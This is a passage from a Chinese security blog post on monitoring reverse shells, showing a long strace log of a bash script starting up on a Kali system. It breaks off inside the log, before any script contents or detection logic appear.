<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="一个信息安全从业者的博客"><meta name="keywords" content="信息安全, 网络安全, 黑客, 渗透测试, Linux安全运维, 安全开发, python"><link rel="stylesheet" type="text/css" href="//fonts.loli.net/css?family=Source+Code+Pro"><link rel="stylesheet" type="text/css" href="/css/style.css?v=2.0.5"><link rel="stylesheet" type="text/css" href="/css/highlight.css?v=2.0.5"><link rel="Shortcut Icon" href="/favicon.ico"><link rel="bookmark" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"><title>反弹shell监控 | pirogue</title></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">反弹shell监控</h1><a id="logo" href="/.">pirogue</a><p class="description">你曾听过一个地方，到达之时我们将拥有一切吗？</p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div><div id="search-form"><div id="result-mask" class="hide"></div><label><input id="search-key" type="text" autocomplete="off" placeholder="搜索"></label><div id="result-wrap" class="hide"><div id="search-result"></div></div><div class="hide"><template id="search-tpl"><div class="item"><a href="/{path}" title="{title}"><div class="title">{title}</div><div class="time">{date}</div><div class="tags">{tags}</div></a></div></template></div></div></div><div id="layout" class="layout-g"><div class="layout-l"><div class="content_container"><div class="post"><h1 class="post-title">反弹shell监控</h1><div class="post-meta"><a href="/2017/07/25/reverse-shell/#comments" class="comment-count"></a><p><span class="date">Jul 25, 2017</span><span><a href="/categories/安全建设/" class="category">安全建设</a></span><span><i id="busuanzi_container_page_pv"><i id="busuanzi_value_page_pv"></i><i>点击</i></i></span></p></div><div class="post-content"><h2 id="一、跟踪系统调用"><a href="#一、跟踪系统调用" class="headerlink" title="一、跟踪系统调用"></a>一、跟踪系统调用</h2><h3 id="1-strace-bash-test-sh"><a href="#1-strace-bash-test-sh" class="headerlink" title="1. strace bash test.sh"></a>1. strace bash test.sh</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br></pre></td><td class="code"><pre><span class="line">root@Kali:~/pirogue/reverse_shell# strace bash test.sh </span><br><span class="line">execve(&quot;/bin/bash&quot;, [&quot;bash&quot;, &quot;test.sh&quot;], [/* 50 vars */]) = 0</span><br><span class="line">brk(NULL)                               = 0x7a2000</span><br><span class="line">access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fcafdb87000</span><br><span class="line">access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">open(&quot;/etc/ld.so.cache&quot;, O_RDONLY|O_CLOEXEC) = 3</span><br><span class="line">fstat(3, &#123;st_mode=S_IFREG|0644, st_size=128554, ...&#125;) = 0</span><br><span class="line">mmap(NULL, 128554, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fcafdb67000</span><br><span class="line">close(3)                                = 0</span><br><span class="line">access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">open(&quot;/lib/x86_64-linux-gnu/libtinfo.so.5&quot;, O_RDONLY|O_CLOEXEC) = 3</span><br><span class="line">read(3, &quot;\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\260\315\0\0\0\0\0\0&quot;..., 832) = 832</span><br><span class="line">fstat(3, &#123;st_mode=S_IFREG|0644, st_size=170776, ...&#125;) = 0</span><br><span class="line">mmap(NULL, 2267936, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fcafd73d000</span><br><span class="line">mprotect(0x7fcafd762000, 2097152, PROT_NONE) = 0</span><br><span class="line">mmap(0x7fcafd962000, 20480, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x25000) = 0x7fcafd962000</span><br><span class="line">close(3)                                = 0</span><br><span class="line">access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">open(&quot;/lib/x86_64-linux-gnu/libdl.so.2&quot;, O_RDONLY|O_CLOEXEC) = 3</span><br><span class="line">read(3, &quot;\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\200\r\0\0\0\0\0\0&quot;..., 832) = 832</span><br><span class="line">fstat(3, &#123;st_mode=S_IFREG|0644, st_size=14640, ...&#125;) = 0</span><br><span class="line">mmap(NULL, 2109680, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fcafd539000</span><br><span class="line">mprotect(0x7fcafd53c000, 2093056, PROT_NONE) = 0</span><br><span class="line">mmap(0x7fcafd73b000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) = 0x7fcafd73b000</span><br><span class="line">close(3)                                = 0</span><br><span class="line">access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">open(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;, O_RDONLY|O_CLOEXEC) = 3</span><br><span class="line">read(3, &quot;\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\320\3\2\0\0\0\0\0&quot;..., 832) = 832</span><br><span class="line">fstat(3, &#123;st_mode=S_IFREG|0755, st_size=1689360, ...&#125;) = 0</span><br><span class="line">mmap(NULL, 3795360, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fcafd19a000</span><br><span class="line">mprotect(0x7fcafd32f000, 2097152, PROT_NONE) = 0</span><br><span class="line">mmap(0x7fcafd52f000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x195000) = 0x7fcafd52f000</span><br><span class="line">mmap(0x7fcafd535000, 14752, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7fcafd535000</span><br><span class="line">close(3)                                = 0</span><br><span class="line">mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fcafdb65000</span><br><span class="line">arch_prctl(ARCH_SET_FS, 0x7fcafdb65b40) = 0</span><br><span class="line">mprotect(0x7fcafd52f000, 16384, PROT_READ) = 0</span><br><span class="line">mprotect(0x7fcafd73b000, 4096, PROT_READ) = 0</span><br><span class="line">mprotect(0x7fcafd962000, 16384, PROT_READ) = 0</span><br><span class="line">mprotect(0x700000, 12288, PROT_READ)    = 0</span><br><span class="line">mprotect(0x7fcafdb8a000, 4096, PROT_READ) = 0</span><br><span class="line">munmap(0x7fcafdb67000, 128554)          = 0</span><br><span class="line">open(&quot;/dev/tty&quot;, O_RDWR|O_NONBLOCK)     = 3</span><br><span class="line">close(3)                                = 0</span><br><span class="line">brk(NULL)                               = 0x7a2000</span><br><span class="line">brk(0x7a3000)                           = 0x7a3000</span><br><span class="line">open(&quot;/usr/lib/locale/locale-archive&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)</span><br><span class="line">brk(0x7a4000)                           = 0x7a4000</span><br><span class="line">open(&quot;/usr/share/locale/locale.alias&quot;, O_RDONLY|O_CLOEXEC) = 3</span><br><span class="line">fstat(3, &#123;st_mode=S_IFREG|0644, st_size=2995, ...&#125;) = 0</span><br><span class="line">brk(0x7a6000)                           = 0x7a6000</span><br><span class="line">read(3, &quot;# Locale name alias data base.\n#&quot;..., 4096) = 2995</span><br><span class="line">brk(0x7a7000)                           = 0x7a7000</span><br><span class="line">brk(0x7a8000)                           = 0x7a8000</span><br><span class="line">read(3, &quot;&quot;, 4096)                       = 0</span><br><span class="line">close(3)                                = 0</span><br><span class="line">open(&quot;/usr/lib/locale/en_US.UTF-8/LC_IDENTIFICATION&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)</span><br><span class="line">open(&quot;/usr/lib/locale/en_US.utf8/LC_IDENTIFICATION&quot;, O_RDONLY|O_CLOEXEC) = 3</span><br><span class="line">fstat(3, &#123;st_mode=S_IFREG|0644, st_size=368, ...&#125;) = 0</span><br><span class="line">mmap(NULL, 368, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fcafdb86000</span><br><span class="line">close(3)                                = 0</span><br><span class="line">open(&quot;/usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache&quot;, O_RDONLY) = 3</span><br><span class="line">fstat(3, &#123;st_mode=S_IFREG|0644, st_size=26258, ...&#125;) = 0</span><br><span class="line">mmap(NULL, 26258, PROT_READ, MAP_SHARED, 3, 0) = 0x7fcafdb7f000</span><br><span class="line">close(3)                                = 0</span><br><span class="line">open(&quot;/usr/lib/locale/en_US.UTF-8/LC_MEASUREMENT&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)</span><br><span class="line">open(&quot;/usr/lib/locale/en_US.utf8/LC_MEASUREMENT&quot;, O_RDONLY|O_CLOEXEC) = 3</span><br><span class="line">fstat(3, &#123;st_mode=S_IFREG|0644, st_size=23, ...&#125;) = 0</span><br><span class="line">mmap(NULL, 23, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fcafdb7e000</span><br><span class="line">close(3)                                = 0</span><br><span class="line">open(&quot;/usr/lib/locale/en_US.UTF-8/LC_TELEPHONE&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)</span><br><span class="line">open(&quot;/usr/lib/locale/en_US.utf8/LC_TELEPHONE&quot;, O_RDONLY|O_CLOEXEC) = 3</span><br><span class="line">fstat(3, &#123;st_mode=S_IFREG|0644, st_size=59, ...&#125;) = 0</span><br><span class="line">mmap(NULL, 59, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fcafdb7d000</span><br><span class="line">close(3)                                = 0</span><br><span class="line">open(&quot;/usr/lib/locale/en_US.UTF-8/LC_ADDRESS&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)</span><br><span class="line">open(&quot;/usr/lib/locale/en_US.utf8/LC_ADDRESS&quot;, O_RDONLY|O_CLOEXEC) = 3</span><br><span class="line">fstat(3, &#123;st_mode=S_IFREG|0644, st_size=167, ...&#125;) = 0</span><br><span class="line">mmap(NULL, 167, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fcafdb7c000</span><br><span class="line">close(3)                                = 0</span><br><span class="line">open(&quot;/usr/lib/locale/en_US.UTF-8/LC_NAME&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)</span><br><span class="line">open(&quot;/usr/lib/locale/en_US.utf8/LC_NAME&quot;, O_RDONLY|O_CLOEXEC) = 3</span><br><span class="line">fstat(3, &#123;st_mode=S_IFREG|0644, st_size=77, ...&#125;) = 0</span><br><span class="line">mmap(NULL, 77, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fcafdb7b000</span><br><span class="line">close(3)                                = 0</span><br><span class="line">open(&quot;/usr/lib/locale/en_US.UTF-8/LC_PAPER&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)</span><br><span class="line">open(&quot;/usr/lib/locale/en_US.utf8/LC_PAPER&quot;, O_RDONLY|O_CLOEXEC) = 3</span><br><span class="line">fstat(3, &#123;st_mode=S_IFREG|0644, st_size=34, ...&#125;) = 0</span><br><span class="line">mmap(NULL, 34, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fcafdb7a000</span><br><span class="line">close(3)                                = 0</span><br><span class="line">open(&quot;/usr/lib/locale/en_US.UTF-8/LC_MESSAGES&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)</span><br><span class="line">open(&quot;/usr/lib/locale/en_US.utf8/LC_MESSAGES&quot;, O_RDONLY|O_CLOEXEC) = 3</span><br><span class="line">fstat(3, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</span><br><span class="line">close(3)                                = 0</span><br><span class="line">open(&quot;/usr/lib/locale/en_US.utf8/LC_MESSAGES/SYS_LC_MESSAGES&quot;, O_RDONLY|O_CLOEXEC) = 3</span><br><span class="line">fstat(3, &#123;st_mode=S_IFREG|0644, st_size=57, ...&#125;) = 0</span><br><span class="line">mmap(NULL, 57, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fcafdb79000</span><br><span class="line">close(3)                                = 0</span><br><span class="line">open(&quot;/usr/lib/locale/en_US.UTF-8/LC_MONETARY&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)</span><br><span class="line">open(&quot;/usr/lib/locale/en_US.utf8/LC_MONETARY&quot;, O_RDONLY|O_CLOEXEC) = 3</span><br><span class="line">fstat(3, &#123;st_mode=S_IFREG|0644, st_size=286, ...&#125;) = 0</span><br><span class="line">mmap(NULL, 286, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fcafdb78000</span><br><span class="line">close(3)                                = 0</span><br><span class="line">brk(0x7a9000)                           = 0x7a9000</span><br><span class="line">open(&quot;/usr/lib/locale/en_US.UTF-8/LC_COLLATE&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)</span><br><span class="line">open(&quot;/usr/lib/locale/en_US.utf8/LC_COLLATE&quot;, O_RDONLY|O_CLOEXEC) = 3</span><br><span class="line">fstat(3, &#123;st_mode=S_IFREG|0644, st_size=1244054, ...&#125;) = 0</span><br><span class="line">mmap(NULL, 1244054, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fcafda35000</span><br><span class="line">close(3)                                = 0</span><br><span class="line">open(&quot;/usr/lib/locale/en_US.UTF-8/LC_TIME&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)</span><br><span class="line">open(&quot;/usr/lib/locale/en_US.utf8/LC_TIME&quot;, O_RDONLY|O_CLOEXEC) = 3</span><br><span class="line">fstat(3, &#123;st_mode=S_IFREG|0644, st_size=2454, ...&#125;) = 0</span><br><span class="line">mmap(NULL, 2454, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fcafdb77000</span><br><span class="line">close(3)                                = 0</span><br><span class="line">brk(0x7aa000)                           = 0x7aa000</span><br><span class="line">open(&quot;/usr/lib/locale/en_US.UTF-8/LC_NUMERIC&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)</span><br><span class="line">open(&quot;/usr/lib/locale/en_US.utf8/LC_NUMERIC&quot;, O_RDONLY|O_CLOEXEC) = 3</span><br><span class="line">fstat(3, &#123;st_mode=S_IFREG|0644, st_size=54, ...&#125;) = 0</span><br><span class="line">mmap(NULL, 54, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fcafdb76000</span><br><span class="line">close(3)                                = 0</span><br><span class="line">open(&quot;/usr/lib/locale/en_US.UTF-8/LC_CTYPE&quot;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)</span><br><span class="line">open(&quot;/usr/lib/locale/en_US.utf8/LC_CTYPE&quot;, O_RDONLY|O_CLOEXEC) = 3</span><br><span class="line">fstat(3, &#123;st_mode=S_IFREG|0644, st_size=328180, ...&#125;) = 0</span><br><span class="line">mmap(NULL, 328180, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fcafd9e4000</span><br><span class="line">close(3)                                = 0</span><br><span class="line">brk(0x7ab000)                           = 0x7ab000</span><br><span class="line">getuid()                                = 0</span><br><span class="line">getgid()                                = 0</span><br><span class="line">geteuid()                               = 0</span><br><span class="line">getegid()                               = 0</span><br><span class="line">rt_sigprocmask(SIG_BLOCK, NULL, [], 8)  = 0</span><br><span class="line">ioctl(-1, TIOCGPGRP, 0x7ffeed7229ac)    = -1 EBADF (Bad file descriptor)</span><br><span class="line">sysinfo(&#123;uptime=195741, loads=[21312, 14080, 6432], totalram=4148080640, freeram=202342400, sharedram=510382080, bufferram=24547328, totalswap=2145382400, freeswap=1889628160, procs=584, totalhigh=0, freehigh=0, mem_unit=1&#125;) = 0</span><br><span class="line">brk(0x7ac000)                           = 0x7ac000</span><br><span class="line">rt_sigaction(SIGCHLD, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7fcafd1cd030&#125;, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=0&#125;, 8) = 0</span><br><span class="line">rt_sigaction(SIGCHLD, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7fcafd1cd030&#125;, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7fcafd1cd030&#125;, 8) = 0</span><br><span class="line">rt_sigaction(SIGINT, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=0&#125;, 8) = 0</span><br><span class="line">rt_sigaction(SIGINT, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, 8) = 0</span><br><span class="line">rt_sigaction(SIGQUIT, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=0&#125;, 8) = 0</span><br><span class="line">rt_sigaction(SIGQUIT, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, 8) = 0</span><br><span class="line">rt_sigaction(SIGTSTP, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=0&#125;, 8) = 0</span><br><span class="line">rt_sigaction(SIGTSTP, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, 8) = 0</span><br><span class="line">rt_sigaction(SIGTTIN, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=0&#125;, 8) = 0</span><br><span class="line">rt_sigaction(SIGTTIN, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, 8) = 0</span><br><span class="line">rt_sigaction(SIGTTOU, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=0&#125;, 8) = 0</span><br><span class="line">rt_sigaction(SIGTTOU, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, 8) = 0</span><br><span class="line">rt_sigprocmask(SIG_BLOCK, NULL, [], 8)  = 0</span><br><span class="line">rt_sigaction(SIGQUIT, &#123;sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, 8) = 0</span><br><span class="line">uname(&#123;sysname=&quot;Linux&quot;, nodename=&quot;Kali&quot;, ...&#125;) = 0</span><br><span class="line">brk(0x7b0000)                           = 0x7b0000</span><br><span class="line">brk(0x7b2000)                           = 0x7b2000</span><br><span class="line">brk(0x7b4000)                           = 0x7b4000</span><br><span class="line">brk(0x7b5000)                           = 0x7b5000</span><br><span class="line">brk(0x7b6000)                           = 0x7b6000</span><br><span class="line">brk(0x7b7000)                           = 0x7b7000</span><br><span class="line">brk(0x7b8000)                           = 0x7b8000</span><br><span class="line">stat(&quot;/root/pirogue/reverse_shell&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</span><br><span class="line">stat(&quot;.&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</span><br><span class="line">stat(&quot;/root&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</span><br><span class="line">stat(&quot;/root/pirogue&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</span><br><span class="line">stat(&quot;/root/pirogue/reverse_shell&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</span><br><span class="line">stat(&quot;/root/pirogue&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</span><br><span class="line">getpid()                                = 4833</span><br><span class="line">brk(0x7b9000)                           = 0x7b9000</span><br><span class="line">getppid()                               = 4831</span><br><span class="line">stat(&quot;.&quot;, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</span><br><span class="line">stat(&quot;/usr/local/sbin/bash&quot;, 0x7ffeed722620) = -1 ENOENT (No such file or directory)</span><br><span class="line">stat(&quot;/usr/local/bin/bash&quot;, 0x7ffeed722620) = -1 ENOENT (No such file or directory)</span><br><span class="line">stat(&quot;/usr/sbin/bash&quot;, 0x7ffeed722620)  = -1 ENOENT (No such file or directory)</span><br><span class="line">stat(&quot;/usr/bin/bash&quot;, 0x7ffeed722620)   = -1 ENOENT (No such file or directory)</span><br><span class="line">stat(&quot;/sbin/bash&quot;, 0x7ffeed722620)      = -1 ENOENT (No such file or directory)</span><br><span class="line">stat(&quot;/bin/bash&quot;, &#123;st_mode=S_IFREG|0755, st_size=1099016, ...&#125;) = 0</span><br><span class="line">stat(&quot;/bin/bash&quot;, &#123;st_mode=S_IFREG|0755, st_size=1099016, ...&#125;) = 0</span><br><span class="line">geteuid()                               = 0</span><br><span class="line">getegid()                               = 0</span><br><span class="line">getuid()                                = 0</span><br><span class="line">getgid()                                = 0</span><br><span class="line">access(&quot;/bin/bash&quot;, X_OK)               = 0</span><br><span class="line">stat(&quot;/bin/bash&quot;, &#123;st_mode=S_IFREG|0755, st_size=1099016, ...&#125;) = 0</span><br><span class="line">geteuid()                               = 0</span><br><span class="line">getegid()                               = 0</span><br><span class="line">getuid()                                = 0</span><br><span class="line">getgid()                                = 0</span><br><span class="line">access(&quot;/bin/bash&quot;, R_OK)               = 0</span><br><span class="line">stat(&quot;/bin/bash&quot;, &#123;st_mode=S_IFREG|0755, st_size=1099016, 